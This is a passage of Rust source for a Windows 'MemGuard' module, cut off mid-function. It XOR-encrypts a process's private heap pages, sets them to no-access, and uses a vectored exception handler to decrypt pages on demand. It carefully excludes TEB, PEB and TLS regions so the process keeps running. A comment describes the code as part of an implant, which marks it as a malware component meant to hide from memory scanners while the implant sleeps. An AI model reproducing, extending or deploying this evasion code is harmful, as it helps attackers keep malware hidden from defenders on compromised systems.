#![allow(unsafe_op_in_unsafe_fn)]

use core::ffi::c_void;
use core::sync::atomic::{AtomicBool, AtomicPtr, AtomicU8, AtomicUsize, Ordering};

use windows_sys::Win32::Foundation::{
    CloseHandle, EXCEPTION_ACCESS_VIOLATION, INVALID_HANDLE_VALUE,
};
use windows_sys::Win32::System::Diagnostics::Debug::{
    AddVectoredExceptionHandler, EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH,
    EXCEPTION_POINTERS,
};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First, Thread32Next,
};
use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_PRIVATE, MEM_RELEASE, MEM_RESERVE, PAGE_GUARD, PAGE_NOACCESS, PAGE_READWRITE,
    VirtualAlloc, VirtualFree, VirtualProtect, VirtualQuery,
};
use windows_sys::Win32::System::Threading::{
    GetCurrentProcessId, GetCurrentThread, OpenThread, Sleep, THREAD_QUERY_INFORMATION,
};
// Only needed by the non-x64 fallback of `current_thread_key`; on x64 the TEB
// pointer is read from `gs` directly, so this import is gated to avoid an unused
// import there.
#[cfg(not(target_arch = "x86_64"))]
use windows_sys::Win32::System::Threading::GetCurrentThreadId;

const PAGE_SIZE: usize = 4096;
const XOR_KEY: u8 = 0x69;
const WALK_START: usize = 0x1_0000;
const MAX_SKIP: usize = 1024;
const CAPACITY_MARGIN: usize = 256;
const ENTRY_SIZE: usize = core::mem::size_of::<PageEntry>();
const ENTRIES_PER_PAGE: usize = PAGE_SIZE / ENTRY_SIZE;
// Reserve a large entries region up front (MEM_RESERVE, no commit cost) and commit
// it incrementally before each encrypt (see commit_entries). 4M entries is ~64 MiB
// of address space reserved but not committed until needed, which removes the
// fixed `page_count + 256` capacity that permanently failed after large heap
// growth.
const RESERVE_CAPACITY_ENTRIES: usize = (64 * 1024 * 1024) / ENTRY_SIZE;
const RESERVE_ENTRIES_BYTES: usize = RESERVE_CAPACITY_ENTRIES * ENTRY_SIZE;
const THREAD_BASIC_INFORMATION_CLASS: u32 = 0;
const TLS_EXPANSION_SLOTS_OFFSET: usize = 0x1780;
// Bounded exclusion span for the TLS expansion block: it is a fixed array of 1024
// 8-byte slots. Excluding the VirtualQuery region would span the whole heap segment
// and leak unrelated plaintext memory past the array, so we exclude a fixed 8 KiB
// page-aligned span instead.
const TLS_EXP_SPAN: usize = 8 * 1024;
// Per-module TLS block pointer array (the table at TEB+0x58): walk only the inline
// slot count; each non-null pointer is to a per-module TLS block page.
const TLS_BLOCK_PTRS: usize = 64;
// Process-global ranges (PEB, ProcessParameters) are identical for every thread in
// the process, so they must be added to the skip set exactly once per build, not
// once per thread (which would consume MAX_SKIP linearly with thread count).
struct GlobalSkipState {
    peb_done: bool,
    pp_done: bool,
}

// Per-entry page state (stored as `AtomicU8` in `PageEntry`). Ownership is taken
// by CAS so the VEH and the watchdog bulk-decrypt can never both operate on the
// same page, eliminating the double-XOR under any interleaving.
// Page-entry states. Deliberately NON-ZERO: the entries array is VirtualAlloc-
// zeroed, so a value of 0 is unambiguously "uninitialized" (PG_UNINIT) and can
// never be mistaken for a real state. This removes the zero-init/PG_ENCRYPTED
// collision that let the bulk decrypt certify (or skip) pages it never actually
// touched.
const PG_UNINIT: u8 = 0; // zero-init sentinel (entries array is VirtualAlloc-zeroed)
const PG_ENCRYPTED: u8 = 1; // ciphertext + PAGE_NOACCESS (the only state a fault can claim)
const PG_BUSY: u8 = 2; // claimed by exactly one actor, mid-decrypt
const PG_PLAINTEXT: u8 = 3; // decrypted and usable

/// Decrypt diagnostics (print_debug/test). Filled by `decrypt_state` so the trace
/// can show how many pages were actually XOR'd back to plaintext versus how many
/// were already `PG_PLAINTEXT` (e.g. lazily decrypted by the VEH during the
/// encrypted window).
#[derive(Default)]
pub struct DecryptDiag {
    pub enc: usize,
    pub busy: usize,
    pub plain: usize,
    pub xored: usize,
}

// Number of tid-keyed recursion-guard slots in the unencrypted state region.
const RECURSION_SLOTS: usize = 32;

// VEH return codes (mirrors the windows-sys EXCEPTION_* constants we import).
const VEH_ACCESS_VIOLATION: i32 = EXCEPTION_ACCESS_VIOLATION;
const VEH_CONTINUE_EXECUTION: i32 = EXCEPTION_CONTINUE_EXECUTION;
const VEH_CONTINUE_SEARCH: i32 = EXCEPTION_CONTINUE_SEARCH;

// Process-wide singleton guard: only one MemGuard may own an encrypted state
// region at a time, so instances never cross-encrypt each other's bookkeeping.
static LIVE: AtomicBool = AtomicBool::new(false);

// Process-wide pointer to the live engine state region. The VEH handler loads
// this atomically; it is null whenever no state region exists (no MemGuard is
// alive, or the region was released-on-drop). This is how the handler reaches
// the encrypted-page list and the tid-keyed recursion guard without touching
// TLS or the heap. The region itself is NEVER freed once a VEH could reference
// it (see `Drop`), so a handler that loaded STATE before a drop can never
// dereference freed memory.
static STATE: AtomicPtr<State> = AtomicPtr::new(core::ptr::null_mut());

// VEH handle returned by AddVectoredExceptionHandler, retained for the process
// lifetime (never removed — see review fix #2).
static VEH_HANDLE: AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());

// Ensures AddVectoredExceptionHandler is invoked at most once per process. Set on
// the first successful init and never cleared (registration is process-lifetime).
static VEH_REGISTERED: AtomicBool = AtomicBool::new(false);

type NtQuerySystemInformationFn = extern "system" fn(u32, *mut c_void, u32, *mut u32) -> i32;
type NtQueryInformationThreadFn =
    extern "system" fn(*mut c_void, u32, *mut c_void, u32, *mut u32) -> i32;

unsafe extern "system" {
    fn GetModuleHandleW(lpModuleName: *const u16) -> *mut c_void;
    fn GetProcAddress(hModule: *mut c_void, lpProcName: *const u8) -> *mut c_void;
}

const NTDLL_W: &[u16] = &[110, 116, 100, 108, 108, 46, 100, 108, 108, 0];

#[repr(C)]
#[derive(Clone, Copy)]
struct SkipRange {
    base: *mut u8,
    len: usize,
}

#[repr(C)]
struct PageEntry {
    base: *mut u8,
    orig_protect: u32,
    // Per-entry page state (`PG_*` constants), atomic so the VEH and the
    // watchdog bulk-decrypt claim a page without a lock. Kept as an atomic
    // marker (never a base null-out) so the sorted-by-base list stays
    // binary-searchable. Both writers CAS PG_ENCRYPTED -> PG_BUSY before
    // touching the page and PG_BUSY -> PG_PLAINTEXT on completion; on an
    // initial VirtualProtect failure they CAS back to PG_ENCRYPTED so the page
    // is never left half-decrypted.
    state: AtomicU8,
}

#[repr(C)]
struct ThreadBasicInformation {
    exit_status: i32,
    teb_base: *mut c_void,
    unique_process: *mut c_void,
    unique_thread: *mut c_void,
    affinity_mask: usize,
    priority: i32,
    base_priority: i32,
}

#[repr(C)]
struct State {
    region_base: *mut u8,
    region_size: usize,
    capacity: usize,
    // Number of tracked (encrypted or claimed) pages. Atomic so the VEH can read
    // it without a lock; the watchdog is always suspended-relative to a faulting
    // thread, so a plain atomic load is race-free in practice (see the
    // concurrency note in `decrypt_page_for_fault_inner`).
    count: AtomicUsize,
    skip_static_count: usize,
    skip_count: usize,
    skip_failed: bool,
    // Resume point for the bulk decrypt (entries below are already plaintext).
    // Atomic for the same reason as `count`.
    decrypt_cursor: AtomicUsize,
    entries: *mut PageEntry,
    #[allow(dead_code)]
    nt_query_system_information: NtQuerySystemInformationFn,
    nt_query_information_thread: NtQueryInformationThreadFn,
    skip: [SkipRange; MAX_SKIP],
    // Tid-keyed recursion guard: each slot holds 0 (free) or the faulting
    // thread's TEB key (active). Collapsing the old (tid, active) pair into one
    // atomic removes the split-state race where a nested fault on the same thread
    // between the tid-CAS and the active-store could miss the guard.
    recursion: [AtomicUsize; RECURSION_SLOTS],
    // Plain recovery counter for VEH diagnostics (print_debug). Lives in the
    // unencrypted State region so the handler can increment it without touching
    // the (possibly encrypted) heap. Every successful lazy decrypt logs a
    // `veh-recover` trace line with this counter (bounded by page count).
    veh_recover_count: AtomicUsize,
}

pub struct MemGuard {
    state: *mut State,
}

impl MemGuard {
    pub fn new() -> Option<Self> {
        if LIVE
            .compare_exchange(false, true, Ordering::Acquire, Ordering::Relaxed)
            .is_err()
        {
            return None;
        }
        let ntdll = unsafe { GetModuleHandleW(NTDLL_W.as_ptr()) };
        if ntdll.is_null() {
            LIVE.store(false, Ordering::Release);
            return None;
        }
        let qsi = unsafe { GetProcAddress(ntdll, b"NtQuerySystemInformation\0".as_ptr()) };
        let qit = unsafe { GetProcAddress(ntdll, b"NtQueryInformationThread\0".as_ptr()) };
        if qsi.is_null() || qit.is_null() {
            LIVE.store(false, Ordering::Release);
            return None;
        }
        let nt_query_system_information: NtQuerySystemInformationFn =
            unsafe { core::mem::transmute(qsi) };
        let nt_query_information_thread: NtQueryInformationThreadFn =
            unsafe { core::mem::transmute(qit) };

        let mut static_skip: [SkipRange; MAX_SKIP] = [SkipRange {
            base: core::ptr::null_mut(),
            len: 0,
        }; MAX_SKIP];
        let mut static_skip_count: usize = 0;
        let skip_ok = unsafe {
            build_static_skip(
                &mut static_skip,
                &mut static_skip_count,
                nt_query_information_thread,
            )
        };
        if !skip_ok {
            LIVE.store(false, Ordering::Release);
            return None;
        }

        let header_offset = match unsafe {
            round_up(
                core::mem::size_of::<State>(),
                core::mem::align_of::<PageEntry>(),
            )
        } {
            Some(v) => v,
            None => {
                LIVE.store(false, Ordering::Release);
                return None;
            }
        };
        // The entries region is page-aligned and starts after the header. The
        // whole region is reserved up front (MEM_RESERVE, no commit cost); the
        // header is committed now and the entries are committed incrementally by
        // commit_entries() before each encrypt. This keeps the VEH (which reads
        // entries via the State pointer with Acquire) from ever observing
        // partially-committed memory.
        let entries_offset = match unsafe { round_up(header_offset, PAGE_SIZE) } {
            Some(v) => v,
            None => {
                LIVE.store(false, Ordering::Release);
                return None;
            }
        };
        let reserve_size = match entries_offset.checked_add(RESERVE_ENTRIES_BYTES) {
            Some(v) => v,
            None => {
                LIVE.store(false, Ordering::Release);
                return None;
            }
        };

        // Reserve the full region (header + 4M entries) without committing it.
        let region_base = unsafe {
            VirtualAlloc(core::ptr::null(), reserve_size, MEM_RESERVE, PAGE_READWRITE) as *mut u8
        };
        if region_base.is_null() {
            LIVE.store(false, Ordering::Release);
            return None;
        }
        // Commit only the header (State + skip array); it is process-lifetime and
        // read by the VEH. The entries region stays reserved but uncommitted.
        let header_commit = match unsafe { round_up(entries_offset, PAGE_SIZE) } {
            Some(v) => v,
            None => {
                unsafe { VirtualFree(region_base as *mut c_void, 0, MEM_RELEASE) };
                LIVE.store(false, Ordering::Release);
                return None;
            }
        };
        if unsafe {
            VirtualAlloc(
                region_base as *mut c_void,
                header_commit,
                MEM_COMMIT,
                PAGE_READWRITE,
            )
        }
        .is_null()
        {
            unsafe { VirtualFree(region_base as *mut c_void, 0, MEM_RELEASE) };
            LIVE.store(false, Ordering::Release);
            return None;
        }

        let entries = unsafe { region_base.add(entries_offset) as *mut PageEntry };
        let skip_static_count = static_skip_count;

        unsafe {
            let state = region_base as *mut State;
            core::ptr::write(
                state,
                State {
                    region_base,
                    region_size: reserve_size,
                    capacity: 0,
                    count: AtomicUsize::new(0),
                    skip_static_count,
                    skip_count: skip_static_count,
                    skip_failed: false,
                    decrypt_cursor: AtomicUsize::new(0),
                    entries,
                    nt_query_system_information,
                    nt_query_information_thread,
                    skip: static_skip,
                    recursion: core::array::from_fn(|_| AtomicUsize::new(0)),
                    veh_recover_count: AtomicUsize::new(0),
                },
            );
            if !add_skip_region(
                &mut (*state).skip,
                &mut (*state).skip_count,
                region_base,
                reserve_size,
            ) {
                VirtualFree(region_base as *mut c_void, 0, MEM_RELEASE);
                LIVE.store(false, Ordering::Release);
                return None;
            }
            (*state).skip_static_count = (*state).skip_count;
        }

        // Publish the state region and register the VEH safety net exactly once
        // per process. STATE is set before registration so a fault that occurs
        // during a later phase of init can already be serviced.
        let state_ptr = region_base as *mut State;
        unsafe {
            STATE.store(state_ptr, Ordering::Release);
            if register_veh() {
                return Some(MemGuard { state: state_ptr });
            }
            // Registration failed (essentially never). Drop the live guard and
            // the global pointer. Per review fix #2 the region is retained for
            // the process lifetime regardless, so we do not VirtualFree it: no
            // VEH is registered yet (so no handler can reference it) and a later
            // re-init simply allocates a fresh region.
            STATE.store(core::ptr::null_mut(), Ordering::Release);
        }
        LIVE.store(false, Ordering::Release);
        None
    }

    pub fn encrypt(&mut self) -> bool {
        unsafe { encrypt_state(self.state, None) }
    }

    /// Encrypt and report progress through `progress` (invoked roughly every
    /// 10k pages). For callers that do not need progress, use `encrypt`.
    pub fn encrypt_with_progress(&mut self, progress: &mut dyn FnMut(usize)) -> bool {
        unsafe { encrypt_state(self.state, Some(progress)) }
    }

    /// Number of excluded (never-encrypted) pages in the current skip set.
    pub fn skip_count(&self) -> usize {
        unsafe { (*self.state).skip_count }
    }

    pub fn decrypt(&mut self) -> bool {
        unsafe { decrypt_state(self.state, None) }
    }

    #[cfg(any(test, feature = "print_debug"))]
    pub fn decrypt_with_diag(&mut self, diag: &mut DecryptDiag) -> bool {
        unsafe { decrypt_state(self.state, Some(diag)) }
    }

    /// Page-state distribution over [0..count) without decrypting. Used by the
    /// trace to show the pre-decrypt state (how many pages are still encrypted).
    pub fn decrypt_histogram(&self) -> (usize, usize, usize) {
        unsafe {
            let entries = (*self.state).entries;
            let n = (*self.state).count.load(Ordering::Acquire);
            let mut enc = 0;
            let mut busy = 0;
            let mut plain = 0;
            for j in 0..n {
                match (*entries.add(j)).state.load(Ordering::Acquire) {
                    PG_ENCRYPTED => enc += 1,
                    PG_BUSY => busy += 1,
                    PG_PLAINTEXT => plain += 1,
                    _ => {}
                }
            }
            (enc, busy, plain)
        }
    }

    pub fn add_exclusion(&mut self, base: *const u8, len: usize) -> bool {
        unsafe {
            let ok = add_skip_region(
                &mut (*self.state).skip,
                &mut (*self.state).skip_count,
                base as *mut u8,
                len,
            );
            if !ok {
                (*self.state).skip_failed = true;
            }
            ok
        }
    }

    pub fn clear_dynamic_exclusions(&mut self) {
        unsafe {
            (*self.state).skip_count = (*self.state).skip_static_count;
            (*self.state).skip_failed = false;
        }
    }

    pub fn find_encrypted_page(&self, addr: *const u8) -> Option<usize> {
        unsafe {
            let entries = (*self.state).entries;
            let page = (addr as usize & !(PAGE_SIZE - 1)) as *mut u8;
            let mut lo = 0usize;
            let mut hi = (*self.state).count.load(Ordering::Acquire);
            while lo < hi {
                let mid = lo + (hi - lo) / 2;
                let e = &*entries.add(mid);
                if e.base < page {
                    lo = mid + 1;
                } else if e.base > page {
                    hi = mid;
                } else {
                    return Some(mid);
                }
            }
            None
        }
    }

    pub fn encrypted_count(&self) -> usize {
        unsafe { (*self.state).count.load(Ordering::Acquire) }
    }
}

impl Drop for MemGuard {
    fn drop(&mut self) {
        unsafe {
            if (*self.state).count.load(Ordering::Acquire) != 0 {
                decrypt_state(self.state, None);
            }
            if (*self.state).count.load(Ordering::Acquire) == 0 {
                // Fully decrypted. UNSAFE INVARIANT — process-lifetime region
                // retention (review fix #2): we deliberately NEVER VirtualFree
                // the state region and NEVER remove the VEH once registered. The
                // region is retained so any in-flight VEH handler that loaded
                // STATE before this drop can never dereference freed memory; a
                // few KB per MemGuard recreation is an accepted trade-off for an
                // implant. We only clear the live guard and the global pointer;
                // a later re-init re-points STATE at a fresh (leaked) region and
                // register_veh() is a no-op because VEH_REGISTERED stays set.
                STATE.store(core::ptr::null_mut(), Ordering::Release);
                LIVE.store(false, Ordering::Release);
            }
            // Otherwise decrypt failed and pages are still PAGE_NOACCESS. The
            // region is intentionally leaked (not freed) so the VEH can still
            // consult the page list, and LIVE stays set so no instance can be
            // created that would cross-encrypt this still-encrypted region.
        }
    }
}

unsafe fn round_up(value: usize, align: usize) -> Option<usize> {
    value.checked_add(align - 1).map(|x| x & !(align - 1))
}

unsafe fn add_skip_region(
    skip: &mut [SkipRange; MAX_SKIP],
    count: &mut usize,
    base: *mut u8,
    len: usize,
) -> bool {
    if *count < MAX_SKIP && len > 0 {
        skip[*count] = SkipRange { base, len };
        *count += 1;
        true
    } else {
        false
    }
}

unsafe fn is_excluded(skip: &[SkipRange], count: usize, page: *mut u8) -> bool {
    let p = page as usize;
    let pend = p.checked_add(PAGE_SIZE).unwrap_or(usize::MAX);
    for i in 0..count {
        let s = &skip[i];
        let sb = s.base as usize;
        let se = sb.checked_add(s.len).unwrap_or(usize::MAX);
        if p < se && sb < pend {
            return true;
        }
    }
    false
}

unsafe fn region_size_of(ptr: *mut c_void) -> usize {
    let mut mbi = core::mem::MaybeUninit::<
        windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION,
    >::uninit();
    let ret = VirtualQuery(
        ptr,
        mbi.as_mut_ptr(),
        core::mem::size_of::<windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION>(),
    );
    if ret == 0 {
        0
    } else {
        mbi.assume_init().RegionSize
    }
}

unsafe fn virtual_walk(mut addr: usize, mut visit: impl FnMut(*mut u8, usize, u32, u32, u32)) {
    let mut mbi = core::mem::MaybeUninit::<
        windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION,
    >::uninit();
    loop {
        let ret = VirtualQuery(
            addr as *const c_void,
            mbi.as_mut_ptr(),
            core::mem::size_of::<windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION>(),
        );
        if ret == 0 {
            break;
        }
        let mbi = mbi.assume_init();
        let base = mbi.BaseAddress as usize;
        let size = mbi.RegionSize;
        if base == 0 {
            break;
        }
        visit(base as *mut u8, size, mbi.State, mbi.Protect, mbi.Type);
        let next = base + size;
        if next <= addr {
            break;
        }
        addr = next;
    }
}

unsafe fn count_candidates(skip: &[SkipRange], skip_count: usize) -> usize {
    let mut count = 0usize;
    virtual_walk(WALK_START, |base, size, state, protect, ty| {
        if state == MEM_COMMIT
            && ty == MEM_PRIVATE
            && protect == PAGE_READWRITE
            && (protect & PAGE_GUARD) == 0
        {
            let mut p = base as usize;
            let end = p + size;
            while p + PAGE_SIZE <= end {
                let page = p as *mut u8;
                if !is_excluded(skip, skip_count, page) {
                    count += 1;
                }
                p += PAGE_SIZE;
            }
        }
    });
    count
}

unsafe fn build_static_skip(
    static_skip: &mut [SkipRange; MAX_SKIP],
    skip_count: &mut usize,
    nt_query_information_thread: NtQueryInformationThreadFn,
) -> bool {
    let pid = GetCurrentProcessId();
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if snap == INVALID_HANDLE_VALUE {
        return false;
    }
    let mut te: THREADENTRY32 = core::mem::zeroed();
    te.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
    let mut ok = true;
    // Track process-global PEB/PP so they are added exactly once, not per-thread.
    let mut globals = GlobalSkipState {
        peb_done: false,
        pp_done: false,
    };
    if Thread32First(snap, &mut te) != 0 {
        loop {
            if te.th32OwnerProcessID == pid
                && !add_thread_skip(
                    static_skip,
                    skip_count,
                    te.th32ThreadID,
                    nt_query_information_thread,
                    &mut globals,
                )
            {
                ok = false;
            }
            if Thread32Next(snap, &mut te) == 0 {
                break;
            }
        }
    } else {
        // Thread32First failure: an enumeration failure, not a clean end-of-
        // snapshot. Fail closed so MemGuard::new() fails and is retried per-cycle.
        ok = false;
    }
    CloseHandle(snap);
    ok
}

unsafe fn add_thread_skip(
    static_skip: &mut [SkipRange; MAX_SKIP],
    skip_count: &mut usize,
    tid: u32,
    nt_query_information_thread: NtQueryInformationThreadFn,
    globals: &mut GlobalSkipState,
) -> bool {
    let h = OpenThread(THREAD_QUERY_INFORMATION, 0, tid);
    if h.is_null() {
        return false;
    }
    let mut tbi = core::mem::MaybeUninit::<ThreadBasicInformation>::uninit();
    let status = nt_query_information_thread(
        h,
        THREAD_BASIC_INFORMATION_CLASS,
        tbi.as_mut_ptr() as *mut c_void,
        core::mem::size_of::<ThreadBasicInformation>() as u32,
        core::ptr::null_mut(),
    );
    let mut ok = true;
    if status >= 0 {
        let tbi = tbi.assume_init();
        let teb = tbi.teb_base;
        if !teb.is_null() {
            let teb_size = region_size_of(teb);
            if !add_skip_region(static_skip, skip_count, teb as *mut u8, teb_size) {
                ok = false;
            }

            // PEB/ProcessParameters are process-global: add them once per build.
            let peb = *(teb.add(0x60) as *const *mut c_void);
            if !peb.is_null() {
                if !globals.peb_done {
                    let peb_size = region_size_of(peb);
                    if peb_size > 0
                        && !add_skip_region(static_skip, skip_count, peb as *mut u8, peb_size)
                    {
                        ok = false;
                    } else {
                        globals.peb_done = true;
                    }
                }
                let pp = *(peb.add(0x20) as *const *mut c_void);
                if !pp.is_null() {
                    if !globals.pp_done {
                        let pp_base = (pp as usize) & !(PAGE_SIZE - 1);
                        let pp_end = (pp as usize) + 0x490;
                        let pp_pages_end = (pp_end + PAGE_SIZE - 1) & !(PAGE_SIZE - 1);
                        let pp_len = pp_pages_end - pp_base;
                        if pp_len > 0
                            && !add_skip_region(static_skip, skip_count, pp_base as *mut u8, pp_len)
                        {
                            ok = false;
                        } else {
                            globals.pp_done = true;
                        }
                    }
                }
            }

            // TLS pointer table (TEB+0x58): exclude the table page(s) and each
            // pointed-to per-module TLS block page. Excluding only the table leaves
            // the blocks encrypted, faulting on post-resume exception-dispatch TLS
            // access.
            let tls = *(teb.add(0x58) as *const *mut c_void);
            if !tls.is_null() {
                let page = (tls as usize & !(PAGE_SIZE - 1)) as *mut u8;
                if !add_skip_region(static_skip, skip_count, page, PAGE_SIZE) {
                    ok = false;
                }
                // Walk the per-module TLS block pointer array (bounded to the inline
                // slot count); exclude each pointed-to block's page.
                for i in 0..TLS_BLOCK_PTRS {
                    let slot = (tls as *const *mut c_void).add(i);
                    let block = *slot;
                    if !block.is_null() {
                        let bpage = (block as usize & !(PAGE_SIZE - 1)) as *mut u8;
                        if !add_skip_region(static_skip, skip_count, bpage, PAGE_SIZE) {
                            ok = false;
                        }
                    }
                }
            }

            // TLS expansion block (TEB+0x1780): exclude a bounded fixed 8 KiB span
            // (1024 slots x 8 bytes), NOT the whole VirtualQuery region which spans
            // the heap segment and leaks unrelated plaintext memory.
            let tls_exp = *(teb.add(TLS_EXPANSION_SLOTS_OFFSET) as *const *mut c_void);
            if !tls_exp.is_null() {
                let base = (tls_exp as usize & !(PAGE_SIZE - 1)) as *mut u8;
                if !add_skip_region(static_skip, skip_count, base, TLS_EXP_SPAN) {
                    ok = false;
                }
            }
        }
    }
    CloseHandle(h);
    ok
}

// Commit enough entries pages for `needed` entries, growing the committed portion
// of the reserved entries region up to `needed` (rounded up to whole pages). Only
// ever called pre-encryption while `count == 0`, so the VEH (which reads entries
// via the State pointer with Acquire) never observes half-committed memory.
// Returns false (fail-closed) if the reservation is exhausted or MEM_COMMIT fails.
unsafe fn commit_entries(state: *mut State, needed: usize) -> bool {
    // The entries pointer is `*mut PageEntry`, so byte offsets must be counted in
    // bytes, not elements. ENTRIES_PER_PAGE * ENTRY_SIZE must equal PAGE_SIZE, or
    // the commit window below would land on the wrong pages. This would have
    // caught the 16x-off regression.
    debug_assert!(ENTRIES_PER_PAGE * ENTRY_SIZE == PAGE_SIZE);
    if (*state).count.load(Ordering::Acquire) != 0 {
        return false;
    }
    if needed > RESERVE_CAPACITY_ENTRIES {
        return false;
    }
    let cur_cap = (*state).capacity;
    if needed <= cur_cap {
        return true;
    }
    let entries = (*state).entries;
    let cur_pages = cur_cap / ENTRIES_PER_PAGE;
    let need_pages = (needed + ENTRIES_PER_PAGE - 1) / ENTRIES_PER_PAGE;
    let max_pages = RESERVE_CAPACITY_ENTRIES / ENTRIES_PER_PAGE;
    if need_pages > max_pages {
        return false;
    }
    let commit_from = (entries as *mut u8).add(cur_pages * PAGE_SIZE) as *mut c_void;
    let commit_size = (need_pages - cur_pages) * PAGE_SIZE;
    if VirtualAlloc(commit_from, commit_size, MEM_COMMIT, PAGE_READWRITE).is_null() {
        return false;
    }
    (*state).capacity = need_pages * ENTRIES_PER_PAGE;
    true
}

unsafe fn encrypt_state(state: *mut State, mut progress: Option<&mut dyn FnMut(usize)>) -> bool {
    if (*state).count.load(Ordering::Acquire) != 0 || (*state).skip_failed {
        return false;
    }
    // A fresh cycle always starts from a clean decrypt cursor.
    (*state).decrypt_cursor.store(0, Ordering::Release);
    // Recount candidates with the current skip set and commit fresh entries for
    // this cycle. The entries region is reserved once at init (MEM_RESERVE) and
    // committed incrementally here, strictly pre-encryption and while count == 0,
    // so the VEH (which reads entries via the State pointer with Acquire) never
    // sees partially-committed memory.
    let skip_count = (*state).skip_count;
    let skip = core::slice::from_raw_parts((*state).skip.as_ptr(), skip_count);
    let page_count = count_candidates(skip, skip_count);
    if !commit_entries(state, page_count + CAPACITY_MARGIN) {
        return false;
    }
    let capacity = (*state).capacity;
    let entries = (*state).entries;
    let mut failed = false;
    let mut stop = false;
    virtual_walk(WALK_START, |base, size, st, protect, ty| {
        if stop {
            return;
        }
        if st == MEM_COMMIT
            && ty == MEM_PRIVATE
            && protect == PAGE_READWRITE
            && (protect & PAGE_GUARD) == 0
        {
            let mut p = base as usize;
            let end = p + size;
            while p + PAGE_SIZE <= end && !stop {
                let page = p as *mut u8;
                if is_excluded(skip, skip_count, page) {
                    p += PAGE_SIZE;
                    continue;
                }
                if (*state).count.load(Ordering::Relaxed) >= capacity {
                    failed = true;
                    stop = true;
                    break;
                }
                // Page is currently PAGE_READWRITE, so it can be mutated in place.
                let slice = core::slice::from_raw_parts_mut(page, PAGE_SIZE);
                for b in slice.iter_mut() {
                    *b ^= XOR_KEY;
                }
                let mut old = 0u32;
                if VirtualProtect(page as *const c_void, PAGE_SIZE, PAGE_NOACCESS, &mut old) != 0 {
                    let idx = (*state).count.load(Ordering::Relaxed);
                    let e = &mut *entries.add(idx);
                    e.base = page;
                    e.orig_protect = protect;
                    e.state = AtomicU8::new(PG_ENCRYPTED);
                    let c = (*state).count.fetch_add(1, Ordering::Release) + 1;
                    if c % 10000 == 0 {
                        if let Some(p) = &mut progress {
                            p(c);
                        }
                    }
                } else {
                    // Protection failed: revert to plaintext and leave the page RW
                    // so it is never left holding ciphertext; stop encrypting the
                    // remaining pages since the cycle will roll back anyway.
                    let slice = core::slice::from_raw_parts_mut(page, PAGE_SIZE);
                    for b in slice.iter_mut() {
                        *b ^= XOR_KEY;
                    }
                    failed = true;
                    stop = true;
                }
                p += PAGE_SIZE;
            }
        }
    });
    !failed
}

// Own and decrypt a single PG_ENCRYPTED page. Returns true if the page is now
// PG_PLAINTEXT (it was already, or we decrypted it). Returns false if a
// concurrent actor claimed it (now PG_BUSY) or it could not be made writable
// (still PG_ENCRYPTED). Callers re-classify a false result: PG_BUSY -> wait for
// the VEH owner; PG_ENCRYPTED -> fail-closed.
unsafe fn decrypt_one_owned(e: *mut PageEntry) -> bool {
    let cur = (*e).state.load(Ordering::Acquire);
    if cur == PG_PLAINTEXT {
        return true; // already decrypted; no-op.
    }
    if cur != PG_ENCRYPTED {
        return false; // PG_BUSY (or unexpected): not ours to claim now.
    }
    if (*e)
        .state
        .compare_exchange(PG_ENCRYPTED, PG_BUSY, Ordering::AcqRel, Ordering::Acquire)
        .is_err()
    {
        return false; // lost the race -> caller sees PG_BUSY.
    }
    let page = (*e).base;
    let orig_protect = (*e).orig_protect;
    let mut old = 0u32;
    if VirtualProtect(page as *const c_void, PAGE_SIZE, PAGE_READWRITE, &mut old) == 0 {
        (*e).state.store(PG_ENCRYPTED, Ordering::Release); // un-claim
        return false;
    }
    let slice = core::slice::from_raw_parts_mut(page, PAGE_SIZE);
    for b in slice.iter_mut() {
        *b ^= XOR_KEY;
    }
    if orig_protect != PAGE_READWRITE {
        // Usable plaintext; record it even if the exotic restore fails.
        let mut old = 0u32;
        if VirtualProtect(page as *const c_void, PAGE_SIZE, orig_protect, &mut old) == 0 {
            (*e).state.store(PG_PLAINTEXT, Ordering::Release);
            return true;
        }
    }
    (*e).state.store(PG_PLAINTEXT, Ordering::Release);
    true
}

unsafe fn decrypt_state(state: *mut State, mut diag: Option<&mut DecryptDiag>) -> bool {
    let entries = (*state).entries;
    let n = (*state).count.load(Ordering::Acquire);
    // Snapshot the page-state distribution BEFORE the bulk pass (for tracing).
    if let Some(d) = diag.as_mut() {
        for j in 0..n {
            match (*entries.add(j)).state.load(Ordering::Acquire) {
                PG_ENCRYPTED => d.enc += 1,
                PG_BUSY => d.busy += 1,
                PG_PLAINTEXT => d.plain += 1,
                _ => {}
            }
        }
    }
    // Main pass: decrypt EVERY entry in [0..count). We deliberately iterate the
    // full range (NOT a cached `decrypt_cursor`) so the pass can never silently
    // skip an entry; a PG_PLAINTEXT entry is simply left as-is (no double-XOR),
    // and an entry that is still PG_ENCRYPTED is XOR'd back to plaintext.
    let mut i = 0usize;
    while i < n {
        let e = entries.add(i);
        let cur = (*e).state.load(Ordering::Acquire);
        if cur != PG_ENCRYPTED {
            i += 1;
            continue;
        }
        if !decrypt_one_owned(e) {
            // decrypt_one_owned failed. If a concurrent VEH claimed this page
            // (now PG_BUSY) we skip and let the strict completion loop wait for
            // it; if it is still PG_ENCRYPTED and unwritable we fail-closed.
            if (*e).state.load(Ordering::Acquire) == PG_ENCRYPTED {
                (*state).decrypt_cursor.store(i, Ordering::Release);
                return false;
            }
            i += 1;
            continue;
        }
        if let Some(d) = diag.as_mut() {
            d.xored += 1;
        }
        i += 1;
    }

    // Strict completion (QA fix #1): certify ONLY when every entry in [0..count)
    // is PG_PLAINTEXT. Any PG_ENCRYPTED page (e.g. a VEH claimant that failed its
    // VirtualProtect and restored to PG_ENCRYPTED after the main pass) is
    // decrypted here so it is never orphaned with no bookkeeping. Any PG_BUSY
    // entry is a VEH owner still mid-recovery; we give it a bounded window
    // (~1s total) to finish before failing closed.
    const MAX_BUSY_WAIT_MS: u64 = 1000;
    const BUSY_BACKOFF_MS: u64 = 5;
    let mut waited_ms = 0u64;
    loop {
        let mut busy = false;
